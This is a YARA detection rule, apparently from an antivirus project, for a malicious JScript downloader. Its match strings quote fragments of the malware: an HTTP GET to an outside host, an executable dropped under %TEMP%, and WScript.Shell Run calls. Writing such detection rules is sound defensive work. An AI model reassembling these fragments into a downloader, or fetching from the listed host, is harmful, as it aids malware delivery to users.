rule sig_20160329_0e3e4507bf92f33a1d579a7dc97510f3 {
  meta:
    description = "datamaliciousorder - file 20160329_0e3e4507bf92f33a1d579a7dc97510f3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "89b56feea8c9abdf39f7b8dca5924acba0e64a703616a4897e3ce38b06da5714"

  strings:
    $s1  = "aU[sN](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function Cz() {return XW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"GIZ8u604mmH5Kkw.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[lP](tT() * 11); if (aU[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Xy(s, t){r = r * 1; return s - t;};" fullword ascii
    $s5  = "var XW = function H() {return WScript[W](\"WScript.Shell\");}(), p = 11;" fullword ascii
    $s6  = "function L(){return \"\" + HK;};" fullword ascii
    $s7  = "function kA() {return ((Y == true) && (Y == w)) ? 1 : r;};" fullword ascii
    $s8  = "function n(tu){XW[\"Run\"](tu, r, r);};" fullword ascii
    $s9  = "function b()" fullword ascii
    $s10 = "function tT(){return 22;};" fullword ascii
    $s11 = "return Xy(Vd, U0);" fullword ascii
    $s12 = "function dP(){return W;};" fullword ascii
    $s13 = " while (Vu){" fullword ascii
    $s14 = "function u(U) {var a = (1, 2, 3, 4, 5, U); return a;};" fullword ascii
    $s15 = "var D = new this[\"Date\"]();" fullword ascii
    $s16 = "var w = false;" fullword ascii
    $s17 = "Y = true; " fullword ascii
    $s18 = "w = true; " fullword ascii
    $s19 = "var Y = false;" fullword ascii
    $s20 = "var h = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}